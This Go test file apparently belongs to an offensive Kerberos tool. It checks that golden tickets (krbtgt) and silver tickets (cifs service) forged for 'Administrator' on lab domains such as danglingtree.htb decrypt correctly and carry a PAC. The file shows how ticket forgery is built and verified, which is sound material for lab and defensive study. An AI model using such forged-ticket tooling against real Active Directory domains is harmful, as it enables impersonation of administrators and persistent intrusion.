package krb

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

func TestBuildPACRoundTripHeader(t *testing.T) {
	key := types.EncryptionKey{
		KeyType:  etypeID.AES256_CTS_HMAC_SHA1_96,
		KeyValue: bytes32("d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240"),
	}
	pac, err := BuildPAC(PACUser{
		User:      "Administrator",
		Domain:    "danglingtree.htb",
		DomainSID: "S-1-5-21-1-2-3",
		RID:       500,
	}, key)
	if err != nil {
		t.Fatal(err)
	}
	if len(pac) < 8+16*4 {
		t.Fatalf("short pac %d", len(pac))
	}
	if binary.LittleEndian.Uint32(pac[0:4]) != 4 {
		t.Fatalf("cBuffers %d", binary.LittleEndian.Uint32(pac[0:4]))
	}
	// server checksum not all zeros
	off := int(binary.LittleEndian.Uint64(pac[8+2*16+8 : 8+2*16+16]))
	var nz bool
	for i := 0; i < 12; i++ {
		if pac[off+4+i] != 0 {
			nz = true
			break
		}
	}
	if !nz {
		t.Fatal("server checksum empty")
	}
}

func TestForgeGoldenDecrypts(t *testing.T) {
	dir := t.TempDir()
	aes := "d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240"
	meta, err := ForgeTicket(ForgeOptions{
		Domain:    "danglingtree.htb",
		User:      "Administrator",
		SID:       "S-1-5-21-111-222-333",
		RID:       500,
		AESKeyHex: aes,
		KVNO:      2,
		Dir:       dir,
	})
	if err != nil {
		t.Fatal(err)
	}
	if meta.Source != "golden" || !strings.Contains(meta.Server, "krbtgt/") {
		t.Fatalf("%+v", meta)
	}
	if _, err := os.Stat(meta.CCache); err != nil {
		t.Fatal(err)
	}
	raw, err := parseAES256Key(aes)
	if err != nil {
		t.Fatal(err)
	}
	tickets, err := LoadCCacheTickets(meta.CCache)
	if err != nil || len(tickets) == 0 {
		t.Fatalf("%v %d", err, len(tickets))
	}
	plain, err := crypto.DecryptEncPart(tickets[0].Ticket.EncPart, types.EncryptionKey{
		KeyType: etypeID.AES256_CTS_HMAC_SHA1_96, KeyValue: raw,
	}, uint32(keyusage.KDC_REP_TICKET))
	if err != nil {
		t.Fatal(err)
	}
	var etp messages.EncTicketPart
	if err := etp.Unmarshal(plain); err != nil {
		t.Fatal(err)
	}
	if len(etp.CName.NameString) == 0 || etp.CName.NameString[0] != "Administrator" {
		t.Fatalf("%+v", etp.CName)
	}
	if len(etp.AuthorizationData) == 0 {
		t.Fatal("missing PAC AD")
	}
	if tickets[0].Ticket.EncPart.KVNO != 2 {
		t.Fatalf("kvno %d", tickets[0].Ticket.EncPart.KVNO)
	}
}

func TestForgeSilverSPN(t *testing.T) {
	dir := t.TempDir()
	meta, err := ForgeTicket(ForgeOptions{
		Domain:    "pirate.htb",
		User:      "Administrator",
		SID:       "S-1-5-21-1-2-3",
		AESKeyHex: "d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240",
		SPN:       "cifs/dc.pirate.htb",
		Dir:       dir,
	})
	if err != nil {
		t.Fatal(err)
	}
	if meta.Source != "silver" || !strings.Contains(strings.ToLower(meta.Server), "cifs/") {
		t.Fatalf("%+v", meta)
	}
	if _, err := os.Stat(filepath.Join(dir, meta.ID+".json")); err != nil {
		t.Fatal(err)
	}
}

func TestForgeTicketRefusesRC4Key(t *testing.T) {
	_, err := ForgeTicket(ForgeOptions{
		Domain: "x.htb", User: "a", SID: "S-1-5-21-1-2-3",
		AESKeyHex: strings.Repeat("ab", 16),
	})
	if err == nil || !strings.Contains(err.Error(), "AES256") {
		t.Fatalf("%v", err)
	}
}

func bytes32(h string) []byte {
	b, err := parseAES256Key(h)
	if err != nil {
		panic(err)
	}
	return b
}
